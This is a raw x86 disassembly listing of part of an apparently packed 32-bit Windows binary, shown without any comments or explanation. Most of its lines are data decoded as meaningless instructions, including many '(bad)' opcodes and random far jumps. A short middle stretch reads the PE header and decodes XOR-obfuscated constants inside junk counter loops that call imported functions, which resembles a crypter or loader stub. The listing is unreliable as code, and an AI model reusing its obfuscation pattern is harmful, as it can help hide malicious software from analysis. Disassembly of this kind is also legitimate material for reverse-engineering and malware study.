  4179e1:	adc    esi,DWORD PTR [eax+ecx*1-0x54]
  4179e5:	mov    dl,0x0
  4179e7:	or     DWORD PTR [ebx-0x5ff4f10],esp
  4179ed:	cmp    BYTE PTR [esi+ebx*4+0x757556f1],dl
  4179f4:	push   esp
  4179f5:	sbb    dh,BYTE PTR [eax+esi*8-0x6d50e38e]
  4179fc:	iret   
  4179fd:	ins    BYTE PTR es:[edi],dx
  4179fe:	out    dx,al
  4179ff:	cld    
  417a00:	outs   dx,BYTE PTR ds:[esi]
  417a01:	inc    eax
  417a02:	mov    esi,0x9e1ef945
  417a07:	pop    ebx
  417a08:	sar    DWORD PTR [ebx-0x3dccf38d],1
  417a0e:	(bad)  
  417a0f:	retf   
  417a10:	sahf   
  417a11:	inc    ebx
  417a12:	jbe    0x417a37
  417a14:	add    BYTE PTR [esi-0x46],al
  417a17:	phaddw mm3,QWORD PTR [ecx+0x59]
  417a1c:	call   0x24154350
  417a21:	sti    
  417a22:	sub    bl,BYTE PTR [bx+si]
  417a25:	or     BYTE PTR [ecx+edi*8+0x54c0095f],ch
  417a2c:	stos   BYTE PTR es:[edi],al
  417a2d:	pop    ebp
  417a2e:	pop    ebp
  417a2f:	sar    BYTE PTR [edx],0xf6
  417a32:	jno    0x417a82
  417a34:	out    dx,eax
  417a35:	lods   eax,DWORD PTR ds:[esi]
  417a36:	aad    0xe1
  417a38:	adc    al,0xf
  417a3a:	div    DWORD PTR ds:0x2f8726f2
  417a40:	add    ebp,DWORD PTR [eax]
  417a42:	add    al,0x30
  417a44:	inc    edx
  417a45:	sub    DWORD PTR [ecx-0x4e],0x79
  417a49:	pop    ebp
  417a4a:	out    0xd0,al
  417a4c:	bound  esp,QWORD PTR [esi]
  417a4e:	fld    QWORD PTR [ecx+0x170ad867]
  417a54:	pop    edi
  417a55:	mov    ecx,0xf3e0401
  417a5a:	or     bl,BYTE PTR [ebp-0x64]
  417a5d:	cmp    eax,0x98f98d3a
  417a62:	mov    ds,WORD PTR [esi]
  417a64:	mov    cl,0x4c
  417a66:	aad    0xf1
  417a68:	or     DWORD PTR [edi-0x33],0xd3173fd9
  417a6f:	fstp   DWORD PTR [esi-0x52a4460a]
  417a75:	add    eax,0xad556d1
  417a7a:	jmp    0xa481:0xd88e000c
  417a81:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a83:	add    BYTE PTR [ecx+0x701cebda],cl
  417a89:	in     al,dx
  417a8a:	aam    0x0
  417a8c:	rcl    DWORD PTR [esi],0x18
  417a8f:	push   esi
  417a90:	cmp    edi,ecx
  417a92:	call   0xe28d:0x2b2c47d2
  417a99:	mov    ah,0xbf
  417a9b:	xchg   ecx,eax
  417a9c:	push   cs
  417a9d:	lods   eax,DWORD PTR ds:[esi]
  417a9e:	sub    edx,ebx
  417aa0:	cwde   
  417aa1:	and    cl,BYTE PTR [edx]
  417aa3:	sbb    eax,0x9f45a66
  417aa8:	cmp    bl,BYTE PTR [edx]
  417aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aab:	and    eax,0x9ad51f3f
  417ab0:	std    
  417ab1:	or     BYTE PTR [ecx-0x1ab84eda],0xf
  417ab8:	pushf  
  417ab9:	repz jb 0x417a5b
  417abc:	jbe    0x417aa8
  417abe:	test   al,0x47
  417ac0:	fwait
  417ac1:	push   cs
  417ac2:	mov    BYTE PTR [ebp-0x3c],ah
  417ac5:	jle    0x417a4e
  417ac7:	cmp    BYTE PTR [edi-0x55096aa6],dh
  417acd:	(bad)  
  417ace:	push   ebx
  417acf:	and    al,0xbd
  417ad1:	ret    0x146
  417ad4:	lock sahf 
  417ad6:	add    al,0x12
  417ad8:	sbb    eax,0xe8c05d7b
  417add:	inc    ecx
  417ade:	fwait
  417adf:	in     eax,dx
  417ae0:	rol    BYTE PTR [ebx],0xb2
  417ae3:	and    BYTE PTR [edi-0x1],bl
  417ae6:	std    
  417ae7:	inc    edi
  417ae8:	xchg   DWORD PTR [ebx],edx
  417aea:	mov    ebp,0xae769d45
  417aef:	adc    BYTE PTR ds:0xc7ab0287,bh
  417af5:	inc    edx
  417af6:	xchg   DWORD PTR [eax],edi
  417af8:	jmp    0xa031f358
  417afd:	adc    BYTE PTR [esi-0x72],ah
  417b00:	jmp    0x417b32
  417b02:	sub    ah,ch
  417b04:	popf   
  417b05:	push   edx
  417b06:	mov    ecx,0xc18a6c65
  417b0b:	inc    ebx
  417b0c:	lods   eax,DWORD PTR ds:[esi]
  417b0d:	mov    WORD PTR [ecx-0x30],?
  417b10:	xchg   esp,eax
  417b11:	mov    eax,0x8a4ab340
  417b17:	add    eax,0xcdccb2ef
  417b1c:	ds clc 
  417b1e:	hlt    
  417b1f:	dec    ebx
  417b20:	cmp    dh,BYTE PTR [esi+esi*4]
  417b23:	cmp    DWORD PTR fs:[eax+eax*8+0x7],esp
  417b28:	mov    eax,ds:0xf511a3be
  417b2d:	jecxz  0x417b5f
  417b2f:	int    0x5a
  417b31:	jge    0x417b6d
  417b33:	sub    BYTE PTR [ebp-0x6b009343],bl
  417b39:	sahf   
  417b3a:	clc    
  417b3b:	sbb    BYTE PTR [eax+0x7c],cl
  417b3e:	sar    BYTE PTR [ebp-0x274422aa],0x30
  417b45:	int3   
  417b46:	push   esi
  417b47:	xchg   esp,eax
  417b48:	add    al,0xf7
  417b4a:	adc    al,0xf
  417b4c:	xor    BYTE PTR [eax],bl
  417b4e:	xor    BYTE PTR [ebp+0x134850ad],bl
  417b54:	mov    esp,0xd97ab4f
  417b59:	icebp  
  417b5a:	push   esi
  417b5b:	bsr    ecx,DWORD PTR [eax-0x7def1cff]
  417b62:	push   ebx
  417b63:	fist   WORD PTR [edx+0x440127ab]
  417b69:	es cmp edi,esp
  417b6c:	lds    ebp,FWORD PTR [ecx]
  417b6e:	pop    ebx
  417b6f:	sub    ch,BYTE PTR ss:0xeb6f22a0
  417b76:	lock arpl ax,di
  417b79:	sbb    eax,0x9199ca14
  417b7e:	jo     0x417b20
  417b80:	stos   DWORD PTR es:[edi],eax
  417b81:	in     eax,0xfa
  417b83:	fiadd  WORD PTR [ecx+0x5c7175e0]
  417b89:	adc    al,0x70
  417b8b:	push   ss
  417b8c:	dec    esi
  417b8d:	mov    bh,0x11
  417b8f:	repnz push ds
  417b91:	pop    ebx
  417b92:	adc    eax,0xc3b48c96
  417b97:	add    ah,ah
  417b99:	xchg   ebx,eax
  417b9a:	mov    ds:0x30ed2a39,eax
  417b9f:	inc    edx
  417ba0:	jb     0x417be5
  417ba2:	aaa    
  417ba3:	in     eax,dx
  417ba4:	test   al,0xd2
  417ba6:	ret    
  417ba7:	jnp    0x417bed
  417ba9:	or     bl,0xa3
  417bac:	ret    0xeca9
  417baf:	sub    ecx,esp
  417bb1:	mov    ah,0xc2
  417bb3:	pop    ecx
  417bb4:	and    BYTE PTR [ebp-0x57],0x2d
  417bb8:	push   0xa6eaeba7
  417bbd:	call   0x7b944a14
  417bc2:	and    ch,BYTE PTR [edx]
  417bc4:	jl     0x417bba
  417bc6:	outs   dx,BYTE PTR ds:[esi]
  417bc7:	ins    DWORD PTR es:[edi],dx
  417bc8:	lea    ecx,[edi]
  417bca:	das    
  417bcb:	pop    edi
  417bcc:	sub    eax,0x5d4e9774
  417bd1:	outs   dx,DWORD PTR ds:[esi]
  417bd2:	sub    ch,cl
  417bd4:	fisub  WORD PTR [ecx+0x4e]
  417bd7:	xchg   DWORD PTR ds:[esi+0x75],edx
  417bdb:	and    al,0xcc
  417bdd:	int    0x70
  417bdf:	jmp    0x1baf:0xdaddf7f6
  417be6:	test   BYTE PTR [esi],0xf5
  417be9:	and    edi,DWORD PTR [ebx-0x32]
  417bec:	stc    
  417bed:	fdivp  st(1),st
  417bef:	scas   eax,DWORD PTR es:[edi]
  417bf0:	loope  0x417be1
  417bf2:	int    0x6d
  417bf4:	ret    
  417bf5:	fs (bad) 
  417bf8:	ins    BYTE PTR es:[edi],dx
  417bf9:	fmul   st(5),st
  417bfb:	push   0xa381b8d4
  417c00:	jl     0x417bda
  417c02:	bound  edi,QWORD PTR [eax+ecx*8]
  417c05:	cld    
  417c06:	jg     0x417bfb
  417c08:	test   eax,0x8b247cab
  417c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c0e:	test   dh,0x2d
  417c11:	gs ss jne 0x417bdd
  417c15:	push   ecx
  417c16:	mov    esi,0x2632d204
  417c1b:	xor    ah,BYTE PTR [esi]
  417c1d:	mov    edi,ebx
  417c1f:	jmp    0xac35:0xf4fbc1ec
  417c26:	and    eax,0x7982759d
  417c2b:	addr16 push ss
  417c2d:	aad    0xef
  417c2f:	jmp    0x417c78
  417c31:	arpl   sp,bp
  417c33:	jg     0x417bbb
  417c35:	mov    esp,0x232741f
  417c3a:	aas    
  417c3b:	cmp    eax,0x80368873
  417c40:	inc    edx
  417c41:	adc    bh,BYTE PTR [edx+0x3b]
  417c44:	or     eax,0xaaf83871
  417c49:	leave  
  417c4a:	pop    edi
  417c4b:	mov    ecx,0x89f2a5a2
  417c50:	retf   0xae15
  417c53:	mov    ch,0xf
  417c55:	es pushf 
  417c57:	adc    al,0x9c
  417c59:	ins    DWORD PTR es:[edi],dx
  417c5a:	xchg   ecx,eax
  417c5b:	sbb    BYTE PTR [edx+0x39],dl
  417c5e:	popa   
  417c5f:	outs   dx,BYTE PTR ds:[esi]
  417c60:	sbb    ebp,edx
  417c62:	push   0x67
  417c64:	aaa    
  417c65:	sub    DWORD PTR [ecx],esi
  417c67:	das    
  417c68:	leave  
  417c69:	push   ds
  417c6a:	dec    ebp
  417c6b:	jl     0x417ca2
  417c6d:	rcl    BYTE PTR ds:0xe34ccb21,1
  417c73:	int    0x6e
  417c75:	push   edi
  417c76:	jbe    0x417c7b
  417c78:	adc    ecx,eax
  417c7a:	fwait
  417c7b:	cmp    dl,ah
  417c7d:	push   edx
  417c7e:	sbb    BYTE PTR [ebx],dl
  417c80:	pop    DWORD PTR [eax]
  417c82:	call   0xc0e0d5e0
  417c87:	pop    ss
  417c88:	sub    esi,DWORD PTR [ebx-0x80]
  417c8b:	jge    0x417c98
  417c8d:	xchg   edi,eax
  417c8e:	jae    0x417ce1
  417c90:	xchg   ebx,eax
  417c91:	push   eax
  417c92:	sbb    BYTE PTR [edx+ebx*1],al
  417c95:	outs   dx,DWORD PTR ds:[esi]
  417c96:	inc    esp
  417c97:	ror    BYTE PTR [ebx+0x6139b78c],cl
  417c9d:	sti    
  417c9e:	mov    ch,0x30
  417ca0:	icebp  
  417ca1:	cmp    BYTE PTR [ebx+0x7df03e60],al
  417ca7:	jmp    0x7d7d:0x64f8b4b1
  417cae:	fcom   DWORD PTR [ebp-0x60]
  417cb1:	jecxz  0x417ca5
  417cb3:	pop    edx
  417cb4:	fimul  DWORD PTR ds:0xa9731888
  417cba:	add    esp,DWORD PTR [eax]
  417cbc:	jnp    0x417c52
  417cbe:	cmp    bh,BYTE PTR [eax+eiz*2-0x7ce6aa44]
  417cc5:	add    al,0xca
  417cc7:	jbe    0x417cb3
  417cc9:	arpl   sp,bx
  417ccb:	out    dx,al
  417ccc:	repnz cmp ebp,DWORD PTR [eax]
  417ccf:	sub    dl,BYTE PTR [edx-0x366197d6]
  417cd5:	mov    ebp,0x92f57102
  417cda:	in     al,dx
  417cdb:	sbb    DWORD PTR [esi],0xaa4c7dc9
  417ce1:	lods   al,BYTE PTR ds:[esi]
  417ce2:	add    eax,0xa8dba17b
  417ce7:	lahf   
  417ce8:	jmp    0x90cd:0xcc4d48c4
  417cef:	sub    esi,DWORD PTR [esi]
  417cf1:	mov    ds:0xa0ff4b13,eax
  417cf6:	fsub   QWORD PTR [esp+ebp*8]
  417cf9:	aad    0x7c
  417cfb:	sahf   
  417cfc:	lods   eax,DWORD PTR ds:[esi]
  417cfd:	fmul   DWORD PTR [edi+0x63]
  417d00:	cmp    eax,0x2946f158
  417d05:	pop    es
  417d06:	sbb    al,0x56
  417d08:	rcl    BYTE PTR ds:0x6c21b676,1
  417d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d0f:	pushf  
  417d10:	mov    DWORD PTR [ecx],eax
  417d12:	sbb    al,dl
  417d14:	sub    ah,bl
  417d16:	push   ds
  417d17:	or     edx,DWORD PTR [ebx+0x3c195f81]
  417d1d:	xchg   ebp,eax
  417d1e:	(bad)  
  417d1f:	jmp    0x417d01
  417d21:	(bad)  
  417d22:	pop    ds
  417d23:	aaa    
  417d24:	xor    esi,ebx
  417d26:	sub    BYTE PTR [edx+0x48df6017],0xad
  417d2d:	out    0x85,eax
  417d2f:	cmc    
  417d30:	xchg   edi,eax
  417d31:	xchg   BYTE PTR [ecx-0x5781911c],cl
  417d37:	fstp   DWORD PTR [eax-0x27]
  417d3a:	fwait
  417d3b:	ins    DWORD PTR es:[edi],dx
  417d3c:	es (bad) 
  417d3f:	jo     0x417d56
  417d41:	adc    ch,BYTE PTR ds:0xb896e8fa
  417d47:	mov    esi,db1
  417d4a:	mov    dh,0xac
  417d4c:	dec    edx
  417d4d:	push   es
  417d4e:	outs   dx,DWORD PTR ds:[esi]
  417d4f:	mov    cs,WORD PTR [ebx]
  417d51:	jg     0x417dc4
  417d53:	std    
  417d54:	add    DWORD PTR [ebx+0x1e39f4bb],esi
  417d5a:	es push edi
  417d5c:	pop    eax
  417d5d:	shl    DWORD PTR ds:0x880552e6,cl
  417d63:	or     DWORD PTR [edx-0x42],0xea5f7fef
  417d6a:	stos   DWORD PTR es:[edi],eax
  417d6b:	add    ch,dl
  417d6d:	mov    al,0x3b
  417d6f:	mov    cl,0x96
  417d71:	and    bl,bl
  417d73:	retf   
  417d74:	jge    0x417d40
  417d76:	sbb    BYTE PTR gs:[esi+0x6078223f],al
  417d7d:	sti    
  417d7e:	ret    
  417d7f:	push   es
  417d80:	sbb    DWORD PTR [edi],0xffffffb8
  417d83:	xor    eax,0xb7e45c52
  417d88:	mov    ebx,0x8e9520ef
  417d8d:	nop
  417d8e:	mov    ebx,0xed2b9377
  417d93:	xchg   DWORD PTR [esi-0x64],ecx
  417d96:	les    esp,FWORD PTR [ebx+0x2104c5f8]
  417d9c:	stos   BYTE PTR es:[edi],al
  417d9d:	inc    ecx
  417d9e:	sbb    al,0x2f
  417da0:	and    DWORD PTR [edx-0x3c],eax
  417da3:	gs and eax,0xa98eeb88
  417da9:	cmp    DWORD PTR [ebx-0x58a189a6],ebp
  417daf:	cmc    
  417db0:	xchg   edi,eax
  417db1:	enter  0xd994,0xe9
  417db5:	jnp    0x417d87
  417db7:	mov    ds:0x82441679,al
  417dbc:	cdq    
  417dbd:	rol    BYTE PTR [ebx+eax*8-0x3e],cl
  417dc1:	xchg   BYTE PTR [esi-0x56],bl
  417dc4:	inc    edi
  417dc5:	push   ebp
  417dc6:	or     DWORD PTR [edx-0x5c8dbfc7],0x5dcfb5f0
  417dd0:	pop    ebx
  417dd1:	dec    esp
  417dd2:	jo     0x417e13
  417dd4:	cli    
  417dd5:	jp     0x417d95
  417dd7:	push   edx
  417dd8:	inc    esi
  417dd9:	sub    DWORD PTR [edi-0x67],0x76
  417ddd:	cmp    al,bl
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	or     BYTE PTR [ebx+0x5f],ah
  417de3:	out    dx,al
  417de4:	or     al,0x30
  417de6:	pop    ebp
  417de7:	int    0xea
  417de9:	mov    ds:0xd2804a01,eax
  417dee:	daa    
  417def:	push   0xe77ee270
  417df4:	mov    ecx,0x3ed681e7
  417df9:	push   eax
  417dfa:	retf   
  417dfb:	cwde   
  417dfc:	add    dl,BYTE PTR [ecx+0x26]
  417dff:	aam    0xe9
  417e01:	sub    edi,DWORD PTR [edi]
  417e03:	mov    bl,BYTE PTR [ebx]
  417e05:	imul   eax,DWORD PTR [edx-0x60],0xffffffc9
  417e09:	mov    ecx,0x64ae2c9b
  417e0e:	inc    edx
  417e0f:	adc    BYTE PTR [eax+0xeb80be2],al
  417e15:	rol    BYTE PTR [ebp-0x2c],0xdd
  417e19:	add    BYTE PTR [ecx+esi*1],ah
  417e1c:	loopne 0x417e38
  417e1e:	or     dh,BYTE PTR [edx+0x5d]
  417e21:	daa    
  417e22:	cmp    ah,BYTE PTR ds:[ebx-0x27]
  417e26:	add    dh,al
  417e28:	test   eax,0xc47abb0d
  417e2d:	pop    ecx
  417e2e:	mov    cl,0x8a
  417e30:	ret    0xdad8
  417e33:	add    DWORD PTR ds:0xfcdf3383,ebx
  417e39:	dec    ebx
  417e3a:	mov    ebx,0x146f0759
  417e3f:	mov    edx,0xbde98c74
  417e44:	xor    al,0xae
  417e46:	retf   0xb791
  417e49:	dec    eax
  417e4a:	test   al,0xd1
  417e4c:	jp     0x417e19
  417e4e:	sahf   
  417e4f:	lods   eax,DWORD PTR ds:[esi]
  417e50:	push   cs
  417e51:	repnz sti 
  417e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e54:	push   esp
  417e55:	mov    eax,0x827ab319
  417e5a:	ins    DWORD PTR es:[edi],dx
  417e5b:	inc    esp
  417e5c:	jae    0x417de4
  417e5e:	lods   eax,DWORD PTR ds:[esi]
  417e5f:	inc    eax
  417e60:	sbb    ch,BYTE PTR [edx+eax*2]
  417e63:	sub    al,0x11
  417e65:	icebp  
  417e66:	push   edi
  417e67:	adc    dl,0x8f
  417e6a:	into   
  417e6b:	adc    bh,ah
  417e6d:	push   ebp
  417e6e:	push   ebp
  417e6f:	xor    bh,BYTE PTR [eax+0x42cbecd8]
  417e75:	sbb    ebx,DWORD PTR [ebp+0x37]
  417e78:	push   esi
  417e79:	test   BYTE PTR [eax],bl
  417e7b:	adc    al,0x51
  417e7d:	jo     0x417eef
  417e7f:	push   0x2f
  417e81:	jp     0x417ed6
  417e83:	mov    dh,BYTE PTR [edi]
  417e85:	pop    es
  417e86:	(bad)  
  417e87:	scas   ax,WORD PTR es:[edi]
  417e89:	jle    0x417ee6
  417e8b:	mov    bl,0x21
  417e8d:	jmp    DWORD PTR [eax-0x2f]
  417e90:	retf   0x2619
  417e93:	jno    0x417e16
  417e95:	repz ret 
  417e97:	sahf   
  417e98:	lods   eax,DWORD PTR ds:[esi]
  417e99:	cwde   
  417e9a:	es push esp
  417e9c:	mov    bl,BYTE PTR [ecx]
  417e9e:	fdiv   DWORD PTR [ebx+ebp*8]
  417ea1:	or     ebp,DWORD PTR [esp]
  417ea4:	inc    edx
  417ea5:	push   edi
  417ea6:	(bad)  
  417ea7:	hlt    
  417ea8:	fsub   DWORD PTR [esi]
  417eaa:	mov    bh,0x27
  417eac:	jb     0x417ea8
  417eae:	fdiv   DWORD PTR [si+0x74]
  417eb2:	ret    0xff16
  417eb5:	call   0xa9189efa
  417eba:	inc    ebx
  417ebb:	sub    DWORD PTR [ebx+0x13b1cf2b],edi
  417ec1:	aas    
  417ec2:	pop    eax
  417ec3:	dec    edx
  417ec4:	leave  
  417ec5:	loopne 0x417f45
  417ec7:	out    0x13,al
  417ec9:	xchg   ecx,eax
  417eca:	or     esi,DWORD PTR [eax]
  417ecc:	ds ds jns 0x417f1f
  417ed0:	and    BYTE PTR [edi],al
  417ed2:	loopne 0x417ec3
  417ed4:	mov    edx,0xe07a3fc4
  417ed9:	(bad)  
  417edb:	push   ebx
  417edc:	jmp    0x6ab9:0x401275dd
  417ee3:	sub    BYTE PTR [eax+0x50],bl
  417ee6:	in     al,dx
  417ee7:	push   0x1c
  417ee9:	push   edi
  417eea:	popa   
  417eeb:	(bad)  
  417eec:	fdivr  QWORD PTR [esi-0x22]
  417eef:	mov    ch,0x2a
  417ef1:	jae    0x417f49
  417ef3:	push   edx
  417ef4:	(bad)  
  417ef5:	pop    ebx
  417ef6:	test   al,0x4
  417ef8:	inc    ebp
  417ef9:	mov    al,ds:0x25760312
  417efe:	inc    esi
  417eff:	mov    edi,0x1d491778
  417f04:	push   edi
  417f05:	push   edx
  417f06:	ja     0x417ede
  417f08:	inc    edx
  417f09:	push   esp
  417f0a:	mov    fs,WORD PTR [edi]
  417f0c:	shl    BYTE PTR [ebx+0x52],1
  417f0f:	sbb    al,0x58
  417f11:	push   ebx
  417f12:	mov    edx,0x26fc91e7
  417f17:	popf   
  417f18:	jmp    0xc46dc10
  417f1d:	sub    al,0x28
  417f1f:	dec    ebx
  417f20:	(bad)  
  417f21:	ds pop es
  417f23:	pop    esi
  417f24:	mov    al,BYTE PTR [eax]
  417f26:	add    DWORD PTR ds:0x433004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x433014,0x43000c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x431010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x42f024,0x14
  417faf:	cmp    DWORD PTR ds:0x42f024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x42f024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x431000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x42b034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x42f024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x42f024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x432010,0x1b
  418001:	cmp    DWORD PTR ds:0x432010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x432010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x42b038
  418029:	mov    ecx,DWORD PTR ds:0x432010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x432010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42478b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41deec
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x433010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x43301c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x43301c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x43301c,ecx
  418091:	cmp    DWORD PTR ds:0x43301c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x43301c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x432004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x42b000
  4180c4:	cmp    DWORD PTR ds:0x43301c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x43301c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x43301c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	out    0x77,al
  418115:	push   ss
  418116:	xchg   ebp,eax
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x23]
  418120:	push   ebx
  418121:	or     ch,BYTE PTR [ecx+0x6a]
  418124:	pop    edx
  418125:	sub    ah,BYTE PTR [esi]
  418127:	test   ch,dh
  418129:	jecxz  0x418195
  41812b:	push   es
  41812c:	push   esi
  41812d:	rcr    DWORD PTR [eax],cl
  41812f:	aam    0x24
  418131:	add    cl,BYTE PTR [di+0x17]
  418135:	dec    ebp
  418136:	call   0x48c266bb
  41813b:	daa    
  41813c:	clc    
  41813d:	xor    DWORD PTR [ebx-0x1d70240c],ecx
  418143:	cmp    al,0x97
  418145:	leave  
  418146:	pop    ds
  418147:	arpl   WORD PTR ds:0x8106d5aa,ax
  41814d:	scas   eax,DWORD PTR es:[edi]
  41814e:	dec    edx
  41814f:	sub    eax,0x748751c5
  418154:	push   0x99de7539
  418159:	mov    gs,WORD PTR [eax-0x57]
  41815c:	aaa    
  41815d:	sub    al,0xb8
  41815f:	call   0xce9f:0x59e173e9
  418166:	inc    edx
  418167:	sub    ecx,eax
  418169:	ss mov dl,0x52
  41816c:	mov    edi,0xa611422e
  418171:	xor    al,0x3f
  418173:	pop    ebx
  418174:	leave  
  418175:	je     0x418149
  418177:	fs loope 0x418104
  41817a:	xor    eax,0xe7806d4
  41817f:	xchg   BYTE PTR [eax+0xfac9a91],bh
  418185:	add    dh,BYTE PTR [ecx+0x4281156e]
  41818b:	dec    edx
  41818c:	sbb    edi,DWORD PTR [edx+ecx*4+0x64444e9f]
  418193:	add    cl,BYTE PTR [esi]
  418195:	xchg   esp,edx
  418197:	mov    eax,ds:0xf5c7eab3
  41819c:	sub    esi,DWORD PTR [edx+0x283ef585]
  4181a2:	cld    
  4181a3:	cmp    ah,BYTE PTR [edi-0x69]
  4181a6:	loopne 0x4181af
  4181a8:	hlt    
  4181a9:	sub    ecx,0x8f690675
  4181af:	inc    ebx
  4181b0:	jno    0x418219
  4181b2:	loop   0x418211
  4181b4:	xchg   ebp,eax
  4181b5:	or     al,0x76
  4181b7:	xor    eax,0xe354e106
  4181bc:	or     edx,DWORD PTR [ecx]
  4181be:	jbe    0x4181c7
  4181c0:	mov    dl,0xd0
  4181c2:	mov    dh,0x2
  4181c4:	jmp    ebx
  4181c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c7:	push   ss
  4181c8:	mov    BYTE PTR [esi-0x3d21f20],al
  4181ce:	out    dx,al
  4181cf:	(bad)  
  4181d0:	jge    0x41819a
  4181d2:	jns    0x4181bd
  4181d4:	sbb    al,dh
  4181d6:	push   cs
  4181d7:	sub    bl,BYTE PTR [ecx]
  4181d9:	std    
  4181da:	es pop esp
  4181dc:	mov    al,0xd0
  4181de:	inc    ebp
  4181df:	rcl    BYTE PTR [eax-0x58],0x33
  4181e3:	(bad)  
  4181e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e5:	and    al,0xed
  4181e7:	js     0x4181d7
  4181e9:	xchg   edi,eax
  4181ea:	push   0x56
  4181ec:	or     al,0x8f
  4181ee:	ja     0x41820a
  4181f0:	sar    DWORD PTR [edx+0x25],cl
  4181f3:	xor    BYTE PTR [ecx+0x4b],dh
  4181f6:	out    0xf8,al
  4181f8:	xchg   ebx,eax
  4181f9:	pusha  
  4181fa:	mov    ecx,0x25c97a98
  4181ff:	sti    
  418200:	rep ins BYTE PTR es:[edi],dx
  418202:	mov    cl,0xe2
  418204:	mov    eax,ds:0xd32ef545
  418209:	fcmovnu st,st(2)
  41820b:	push   0x889ba1de
  418210:	cmp    BYTE PTR ds:0xea92378,0x32
  418217:	mov    ebx,ebx
  418219:	cmp    eax,0x2f396a6
  41821e:	lods   eax,DWORD PTR ds:[esi]
  41821f:	pop    ebx
  418220:	sub    ebx,DWORD PTR [ecx]
  418222:	pop    esi
  418223:	jae    0x418256
  418225:	inc    esi
  418226:	ret    0x192d
  418229:	arpl   WORD PTR [ecx],bx
  41822b:	mov    dl,0x7d
  41822d:	popf   
  41822e:	mov    al,0xa0
  418230:	lods   al,BYTE PTR ds:[esi]
  418231:	mov    ebx,0x65ffd7b9
  418236:	les    ecx,FWORD PTR [esi+0x14]
  418239:	mov    dh,0xe3
  41823b:	push   ebx
  41823c:	push   esp
  41823d:	dec    edi
  41823f:	cld    
  418240:	out    0xba,al
  418242:	rcr    BYTE PTR ds:0x5fcd35aa,cl
